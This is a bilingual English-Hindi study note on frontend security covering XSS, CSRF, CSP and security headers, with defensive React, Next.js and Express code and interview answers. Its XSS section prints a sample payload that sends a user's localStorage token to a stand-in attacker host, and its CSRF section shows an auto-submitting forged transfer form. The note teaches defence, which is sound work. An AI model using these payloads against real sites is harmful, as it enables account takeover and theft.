# F14. Frontend Security (XSS, CSRF, CSP)
# हिंदी में: Frontend Security — ब्राउज़र की तरफ़ के हमलों से बचाव: XSS (हमलावर की script आपके पेज में चलना), CSRF (यूज़र के login का फ़ायदा उठाकर दूसरी साइट से request भेजना), Clickjacking, और CSP (ब्राउज़र को बताना कि कौन-सी scripts चलने दो)

---

## 🔵 Simple Definition (English)
- **XSS (Cross-Site Scripting)**: an attacker gets **their JavaScript to run in your page** in a victim's browser, by injecting it via user content (comments, names, URLs) that you render unsafely. Once it runs, it can read data, call APIs as the user, and steal tokens in localStorage. Types: **stored**, **reflected**, **DOM-based**.
- **CSRF (Cross-Site Request Forgery)**: a malicious site makes the victim's browser send an **authenticated request** to your site (cookies are attached automatically), e.g. "transfer money" or "change email". Defences: **SameSite cookies**, **CSRF tokens**, checking `Origin`.
- **CSP (Content Security Policy)**: a response header telling the browser **which sources of scripts, styles, images, frames and connections are allowed**. It is a powerful second layer against XSS.
- Also: **clickjacking** (your site in a hidden iframe → `frame-ancestors`/`X-Frame-Options`), **open redirects**, **supply-chain attacks** (malicious npm packages, compromised third-party scripts → SRI), **sensitive data exposure** (secrets in JS bundles, tokens in URLs).

## 🔵 सरल परिभाषा (Hindi)
XSS = हमलावर अपनी JavaScript आपके पेज में चलवा देता है (comment, नाम या URL में script डालकर, जिसे आपने बिना सुरक्षा के दिखा दिया) — फिर वो यूज़र बनकर API चला सकता है, localStorage के token चुरा सकता है।
CSRF = कोई बुरी साइट यूज़र के ब्राउज़र से आपकी साइट पर request भिजवा देती है (cookies अपने-आप जाती हैं) — बचाव: SameSite cookie, CSRF token, Origin जाँच। CSP = header जो ब्राउज़र को बताता है कि सिर्फ़ इन जगहों की scripts/images चलने दो — XSS के ख़िलाफ़ दूसरी दीवार।

---

## 🔴 Problem it Solves
The browser runs **any JavaScript in your origin with full power**. A single XSS bug in a comment box can:
- Steal session tokens and **take over accounts** (e.g., worms like the 2005 Samy MySpace worm spread to 1M+ profiles in a day).
- Make purchases, change passwords or exfiltrate PII.
CSRF can perform state-changing actions without the user knowing. Third-party scripts (analytics, chat widgets, ads) run with the same power. A compromised one (e.g., the Magecart attacks on British Airways in 2018 that skimmed card details) leaks payment data.
Frontend engineers own **rendering safely, configuring headers, choosing token storage, and controlling third-party code**.

## 🔴 यह क्यों बना? (Hindi)
आपके origin में चलने वाली कोई भी JavaScript पूरी ताक़त रखती है — एक XSS bug से account चोरी, ख़रीदारी, password बदलना, निजी डेटा बाहर (2005 में Samy worm एक दिन में 10 लाख+ MySpace profiles में फैला)।
CSRF यूज़र को पता चले बिना बदलाव करवा देता है; third-party scripts भी उतनी ही ताक़त रखती हैं (2018 में British Airways पर Magecart हमले में card details चोरी)। इसलिए सुरक्षित rendering, headers, token कहाँ रखें और बाहरी कोड का नियंत्रण — frontend की ज़िम्मेदारी।

---

## 🟢 How it Works — Step by Step

### XSS: how it happens

```
Stored XSS:   attacker saves comment:  <img src=x onerror="fetch('https://evil.io?c='+localStorage.token)">
              your app renders comment as HTML → every viewer's browser runs it
Reflected:    https://shop.com/search?q=<script>…</script> → server echoes q into HTML unescaped
DOM-based:    client JS does element.innerHTML = location.hash.slice(1)  (never touches server)
Other sinks:  href="javascript:…", eval(), new Function(), setTimeout(string), dangerouslySetInnerHTML,
              document.write, jQuery .html(), template injection, unsafe markdown rendering
```

### XSS defences (layered)

```
1. Output encoding by default: React/JSX escapes text in {…} → <script> shows as text ✅
2. Never insert untrusted HTML; if you must (rich text, markdown): sanitize with DOMPurify
   (allow-list tags/attributes) — server-side too
3. Validate URLs: only http(s)/mailto in href/src → block javascript: / data: schemes
4. Avoid dangerous sinks: innerHTML, eval, string timers; use textContent; Trusted Types (Chrome) to enforce
5. CSP (below) blocks inline/injected scripts even if a bug slips through
6. HttpOnly cookies for session/refresh tokens → JS (and XSS) can't read them
7. Escape data embedded in <script> tags in SSR (JSON.stringify + escape '<' as <)
```

### CSRF: how it happens & defences

```
Victim logged into bank.com (session cookie). Visits evil.com, which contains:
  <form action="https://bank.com/transfer" method="POST"><input name="to" value="attacker">…</form>
  <script>document.forms[0].submit()</script>
Browser sends POST to bank.com WITH bank.com cookies → transfer happens (if no protection)

Defences:
✅ SameSite cookies: SameSite=Lax (default in modern browsers) → cookies not sent on cross-site POST/fetch
                     SameSite=Strict for highly sensitive apps (not even on cross-site link navigation)
✅ CSRF token (synchronizer or double-submit): server issues random token; client sends it in a header/form
   field; attacker site can't read it (same-origin policy)
✅ Check Origin / Sec-Fetch-Site headers on state-changing requests
✅ Never change state with GET
✅ Token in Authorization header (not cookie) → not auto-sent → CSRF-immune (but XSS-exposed if in localStorage)
```

### CSP: Content Security Policy

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m' 'strict-dynamic' https://checkout.razorpay.com;
  style-src 'self' 'unsafe-inline';            (inline styles common; tighten if possible)
  img-src 'self' https://cdn.myapp.com data: blob:;
  connect-src 'self' https://api.myapp.com wss://rt.myapp.com https://*.sentry.io;
  frame-src https://api.razorpay.com;          (payment iframe)
  frame-ancestors 'none';                       (anti-clickjacking — replaces X-Frame-Options)
  object-src 'none'; base-uri 'self'; form-action 'self';
  upgrade-insecure-requests;
  report-to csp-endpoint;
Nonce-based: server generates a random nonce per response; only <script nonce="…"> runs → injected scripts blocked
Roll out with Content-Security-Policy-Report-Only first, watch reports, then enforce
```

### Other important headers & practices

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload   → HTTPS only
X-Content-Type-Options: nosniff                                            → no MIME sniffing
Referrer-Policy: strict-origin-when-cross-origin                           → don't leak full URLs
Permissions-Policy: camera=(), geolocation=(self)                          → limit powerful APIs
Subresource Integrity: <script src="https://cdn…/lib.js" integrity="sha384-…" crossorigin>
Open redirect: validate ?next= against an allow-list of paths
Secrets: anything in the JS bundle is PUBLIC (NEXT_PUBLIC_*, EXPO_PUBLIC_*) → never API secrets there
Dependencies: npm audit / Dependabot / lockfiles; minimize third-party scripts; sandboxed iframes
```

## 🟢 कैसे काम करता है? (Hindi)
1. XSS: हमलावर comment/URL में script डालता है, आप उसे HTML की तरह दिखा देते हैं → हर देखने वाले के ब्राउज़र में चलती है; बचाव: React का default escaping, HTML दिखाना ही हो तो DOMPurify से साफ़, `javascript:` links रोको, innerHTML/eval से बचो।
2. Session/refresh token HttpOnly cookie में रखो — JavaScript (और XSS) उसे पढ़ नहीं सकती; localStorage में token = XSS में चोरी।
3. CSRF: बुरी साइट आपकी साइट पर form भिजवाती है और cookies अपने-आप जाती हैं; बचाव: SameSite=Lax/Strict cookie, CSRF token header, Origin जाँच, GET से कभी बदलाव नहीं।
4. CSP header: सिर्फ़ अपनी और भरोसेमंद जगहों की scripts चलें, nonce वाली scripts ही चलें; `frame-ancestors 'none'` से clickjacking बंद; पहले Report-Only से आज़माओ।
5. बाक़ी: HSTS, nosniff, Referrer-Policy, बाहरी scripts पर SRI, open redirect की जाँच, bundle में कोई secret नहीं (वो सबको दिखता है), npm dependencies की जाँच।

---

## 🟡 Real World Example

**Samy worm (MySpace, 2005)** — a stored XSS in profile pages self-replicated to over a million profiles within about 20 hours. It's the classic demonstration of XSS impact.

**British Airways / Magecart (2018)** — attackers modified a third-party JavaScript file on the payment page to skim card details of hundreds of thousands of customers. The UK ICO fined BA £20M. Lessons: SRI, CSP `connect-src` restrictions, minimal third-party scripts on payment pages.

**Google, GitHub, Facebook** — deploy strict nonce-based CSPs and Trusted Types to eliminate entire classes of DOM XSS. Google has reported that strict CSP plus Trusted Types significantly reduces exploitable XSS.

**Razorpay / Paytm checkouts** — embed payment collection in **iframes from the payment provider's origin**, so the merchant page's JavaScript (and any XSS on it) can't read card details. This also limits PCI-DSS scope.

## 🟡 Real Example Hindi में
2005 में MySpace पर Samy worm (stored XSS) ~20 घंटे में 10 लाख+ profiles में फैल गया। 2018 में British Airways के payment page की एक third-party JS बदलकर card details चोरी हुईं — £20M जुर्माना; सबक: SRI, CSP, payment page पर कम बाहरी scripts।
Razorpay/Paytm checkout card details को अपने origin के iframe में लेते हैं, ताकि merchant के पेज की JavaScript (या उस पर XSS) card details न पढ़ सके।

---

## 🟠 My Stack Example

### React: safe by default, dangerous when you opt out
```tsx
// ✅ Escaped automatically — shows the text literally
<p>{comment.text}</p>

// ❌ XSS if comment.html is user-controlled
<div dangerouslySetInnerHTML={{ __html: comment.html }} />

// ✅ Sanitize when you must render rich text / markdown output
import DOMPurify from 'isomorphic-dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(markdownToHtml(comment.md), { USE_PROFILES: { html: true } }) }} />

// ❌ javascript: URL XSS (React warns, but don't rely on it)
<a href={user.website}>Website</a>
// ✅ Allow only safe schemes
const safeUrl = (u: string) => { try { const x = new URL(u); return ['http:', 'https:'].includes(x.protocol) ? x.href : '#'; } catch { return '#'; } };
<a href={safeUrl(user.website)} rel="noopener noreferrer nofollow" target="_blank">Website</a>
```

### Next.js: nonce-based CSP via middleware
```ts
// middleware.ts
import { NextResponse, type NextRequest } from 'next/server';
export function middleware(req: NextRequest) {
  const nonce = Buffer.from(crypto.randomUUID()).toString('base64');
  const csp = [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic' https://checkout.razorpay.com`,
    `style-src 'self' 'unsafe-inline'`,
    `img-src 'self' https://cdn.myapp.com data: blob:`,
    `connect-src 'self' https://api.myapp.com wss://rt.myapp.com`,
    `frame-src https://api.razorpay.com`, `frame-ancestors 'none'`, `object-src 'none'`, `base-uri 'self'`,
  ].join('; ');
  const headers = new Headers(req.headers);
  headers.set('x-nonce', nonce);                                       // read in layout to pass to <Script nonce>
  const res = NextResponse.next({ request: { headers } });
  res.headers.set('Content-Security-Policy', csp);
  res.headers.set('Strict-Transport-Security', 'max-age=63072000; includeSubDomains; preload');
  res.headers.set('X-Content-Type-Options', 'nosniff');
  res.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
  return res;
}
```

### Express backend: helmet + CSRF protection for cookie sessions
```js
import helmet from 'helmet';
app.use(helmet());                                    // sane security headers

// Session/refresh cookie: HttpOnly + Secure + SameSite
res.cookie('refresh_token', token, { httpOnly: true, secure: true, sameSite: 'lax', path: '/auth/refresh', maxAge: 30 * 864e5 });

// Double-submit CSRF token for state-changing routes (when using cookie auth)
app.use((req, res, next) => {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
  const origin = req.get('origin');
  if (origin && origin !== 'https://app.myapp.com') return res.status(403).json({ error: { code: 'BAD_ORIGIN' } });
  if (req.get('x-csrf-token') !== req.cookies.csrf_token) return res.status(403).json({ error: { code: 'CSRF' } });
  next();
});
```

### FastAPI: escaping JSON embedded in HTML + safe redirects
```python
ALLOWED_NEXT = {"/", "/orders", "/account"}
@app.get("/login/callback")
async def callback(next: str = "/"):
    return RedirectResponse(next if next in ALLOWED_NEXT else "/")     # no open redirect
```

### Third-party script with Subresource Integrity
```html
<script src="https://cdn.jsdelivr.net/npm/dayjs@1.11.13/dayjs.min.js"
        integrity="sha384-…" crossorigin="anonymous"></script>
```

### React Native notes
```
- No DOM XSS, but WebViews are risky: never inject untrusted HTML; disable JS in WebView if not needed;
  restrict originWhitelist; validate postMessage data
- Deep links are untrusted input (M11): validate params before navigation/API calls
- Secrets in the app bundle can be extracted → keep them on the server; tokens in Keychain/Keystore (M15)
```

---

## ⚫ Interview Questions + Answers

**Q1: What is XSS and how do you prevent it in a React app?**
A1: XSS is injection of attacker-controlled script into pages viewed by others. It can be stored, reflected or DOM-based. React escapes values interpolated in JSX by default, which prevents most cases. Risks remain with `dangerouslySetInnerHTML`, `javascript:` URLs, direct DOM APIs (innerHTML), eval-like functions, third-party libraries and SSR data embedding. Prevent it by never rendering untrusted HTML without sanitization (DOMPurify with an allow-list), validating URL schemes, avoiding dangerous sinks, escaping embedded JSON, and adding a strict CSP (nonces, `strict-dynamic`), Trusted Types and HttpOnly cookies to limit the damage if a bug slips through.

**Q2: Explain CSRF and modern defences.**
A2: CSRF tricks a logged-in user's browser into sending a state-changing request to your site from another site, relying on automatic cookie attachment. Defences: SameSite cookies (Lax by default blocks cross-site subresource and POST requests; Strict blocks more), anti-CSRF tokens (synchronizer or double-submit) that attackers can't read, verifying `Origin` or `Sec-Fetch-Site`, never using GET for mutations, and re-authentication for critical actions. Bearer tokens in headers aren't vulnerable to CSRF but must be protected from XSS.

**Q3: What is CSP and how would you roll it out?**
A3: Content Security Policy is a response header that restricts where the page can load scripts, styles, images, frames and connections from, and whether inline scripts or eval are allowed. A strict nonce-based policy (`script-src 'nonce-…' 'strict-dynamic'`, `object-src 'none'`, `base-uri 'self'`, `frame-ancestors`) blocks injected scripts even if XSS exists. Roll it out with `Content-Security-Policy-Report-Only` first, collect violation reports, fix legitimate violations (inline scripts, third parties), then enforce and keep monitoring reports.

**Q4: Where should a web app store auth tokens, from a security perspective?**
A4: The safest common pattern keeps the refresh token in an HttpOnly, Secure, SameSite cookie, scoped to the refresh path, so JavaScript and XSS can't read it. The short-lived access token is kept in memory (not localStorage) and refreshed silently, with CSRF protections on cookie-authenticated endpoints. Alternatively, a BFF holds tokens server-side and uses a session cookie. localStorage is readable by any script on the origin, so XSS can steal long-lived tokens from it. (Details in F16.)

**Q5: How do you secure third-party scripts on a checkout page?**
A5: Minimize them: no marketing tags or chat widgets on payment pages. Self-host or pin versions with Subresource Integrity hashes. Restrict with CSP (`script-src`, `connect-src` allow-lists so skimmers can't exfiltrate). Isolate payment input in the provider's iframe (Razorpay, Stripe Elements) so your page never touches card data. Monitor for script changes and CSP reports. Audit vendors and dependencies regularly (npm audit, lockfiles, Dependabot).

---

## 🔷 Trade-offs
✅ Strict CSP: strong XSS mitigation — ❌ breaks inline scripts/3rd parties; needs nonce plumbing and monitoring.
✅ HttpOnly cookies: XSS can't steal tokens — ❌ need CSRF defences, cross-domain complexity.
✅ Sanitizing rich text: enables UGC formatting — ❌ sanitizer config must be maintained; performance cost.
✅ SameSite=Strict: max CSRF protection — ❌ users arriving via external links appear logged out.

---

## 📝 Key Terms (English + Hindi)
| Term | Meaning | Hindi |
|------|---------|-------|
| XSS | Injected script runs in your page | आपके पेज में बाहरी script |
| Stored / Reflected / DOM XSS | XSS variants | XSS के प्रकार |
| Sanitization | Removing dangerous HTML | ख़तरनाक HTML हटाना |
| CSRF | Forged cross-site request | दूसरी साइट से नक़ली request |
| SameSite cookie | Limits cross-site cookie sending | cross-site cookie रोकना |
| CSRF token | Secret proving same-site request | असली request का सबूत |
| CSP | Allowed content sources policy | अनुमति वाले स्रोतों की नीति |
| Nonce | One-time random value | एक बार का random मान |
| Clickjacking | Hidden iframe tricking clicks | छुपे iframe से धोखे का click |
| SRI | Hash check for external scripts | बाहरी script की hash जाँच |

---

## ⚡ 3-Line Summary
**English:**
1. XSS: rely on React escaping, sanitize any HTML (DOMPurify), validate URLs, avoid dangerous sinks, add strict nonce CSP + Trusted Types.
2. CSRF: SameSite cookies + CSRF tokens + Origin checks; no state changes via GET; tokens in HttpOnly cookies, not localStorage.
3. Harden headers (CSP, HSTS, frame-ancestors, nosniff), control third-party scripts (SRI, iframes for payments), keep secrets out of bundles.

**Hindi:**
1. XSS: React escaping, HTML हो तो DOMPurify, URL जाँच, innerHTML/eval नहीं, strict CSP।
2. CSRF: SameSite cookie + CSRF token + Origin जाँच; GET से बदलाव नहीं; token HttpOnly cookie में।
3. Headers (CSP, HSTS, frame-ancestors), बाहरी scripts पर नियंत्रण (SRI, payment iframe), bundle में secret नहीं।

---

## ➡️ Next Topic Suggestion
**F15. CORS** — Browsers block cross-origin API calls by default, which confuses everyone at some point. Next: same-origin policy, CORS headers, preflight requests and credentials, and how to configure them correctly in Express, FastAPI and Nginx.
